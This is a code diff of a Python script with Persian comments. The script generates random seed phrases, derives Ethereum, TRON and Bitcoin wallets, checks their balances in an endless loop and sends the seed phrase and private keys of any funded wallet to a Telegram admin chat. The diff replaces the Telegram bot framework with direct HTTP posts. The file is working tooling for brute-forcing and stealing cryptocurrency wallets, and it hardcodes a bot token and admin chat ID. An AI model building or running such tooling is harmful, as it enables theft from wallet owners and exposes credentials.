@@ -1,9 +1,5 @@
 import asyncio
 import time
-import random
-from datetime import datetime
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
 import requests
 from mnemonic import Mnemonic
 from eth_account import Account
@@ -13,11 +9,17 @@ from tronpy.keys import PrivateKey as TronPrivateKey
 from bit import Key as BitKey
 
 # ======================== تنظیمات ========================
-TELEGRAM_TOKEN = "8913835905:AAHnXsmjJB1WZVfoGf9ExJjqVpF0XaMp9WA"
-
+TOKEN = "8913835905:AAHnXsmjJB1WZVfoGf9ExJjqVpF0XaMp9WA"
+ADMIN_CHAT_ID = "8561215151"  # آیدی عددی خودت
 DERIVATION_DEPTH = 5
 BATCH_SIZE = 4
-ADMIN_CHAT_ID = "8561215151"  # آیدی عددی خودت
+
+def send_message(chat_id, text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    try:
+        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=5)
+    except:
+        pass
 
 # ======================== تولید ولت ========================
 def generate_wallet_family(family_index):
@@ -99,8 +101,8 @@ async def check_balance(wallet):
 
     return results
 
-# ======================== ارسال به تلگرام ========================
-async def send_to_telegram(context, wallet, balances):
+# ======================== گزارش ========================
+async def report_wallet(wallet, balances):
     msg = "<b>🔔 کیف‌پول با موجودی پیدا شد!</b>\n"
     msg += f"🧠 عبارت: <code>{wallet['mnemonic']}</code>\n"
     msg += f"🔹 شاخص فرزند: {wallet['child_index']}\n"
@@ -112,15 +114,14 @@ async def send_to_telegram(context, wallet, balances):
                     f"موجودی: {balances[net]['balance']}\n"
                     f"کلید خصوصی: <code>{wallet[net_lower]['priv']}</code>\n")
     msg += "\n"
-    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode='HTML')
+    send_message(ADMIN_CHAT_ID, msg)
 
 # ======================== حلقه اسکن ========================
-async def infinite_scan(context):
+async def infinite_scan():
     total_checked = 0
     found_wallets = 0
     start_time = time.time()
     print("♾️ اسکن بی‌نهایت شروع شد...")
-
     while True:
         batch_start = time.time()
         all_wallets = []
@@ -142,44 +143,21 @@ async def infinite_scan(context):
         for wallet in all_wallets:
             balances = await check_balance(wallet)
             if balances:
-                await send_to_telegram(context, wallet, balances)
+                await report_wallet(wallet, balances)
                 found_wallets += 1
 
         total_checked += len(all_wallets)
         batch_time = time.time() - batch_start
         elapsed = time.time() - start_time
         speed = total_checked / elapsed if elapsed > 0 else 0
-
         print(f"📊 دسته: {BATCH_SIZE} بذر ({len(all_wallets)} آدرس) در {batch_time:.2f} ثانیه | مجموع: {total_checked} | موجودی: {found_wallets} | سرعت: {speed:.1f}/s")
-
         wait_time = max(0, 25 - batch_time)
         if wait_time > 0:
             await asyncio.sleep(wait_time)
 
-# ======================== دستورات ربات ========================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🚀 ربات ولت‌یاب فعال شد!\n\n"
-        "دستورات:\n"
-        "/start - نمایش این پیام\n"
-        "/status - وضعیت ربات"
-    )
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("✅ ربات فعال است و در حال اسکن...")
-
 # ======================== اجرا ========================
-def main():
-    application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("status", status))
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.create_task(infinite_scan(application))
-
-    print("🤖 ربات شروع شد...")
-    application.run_polling()
+async def main():
+    await infinite_scan()
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
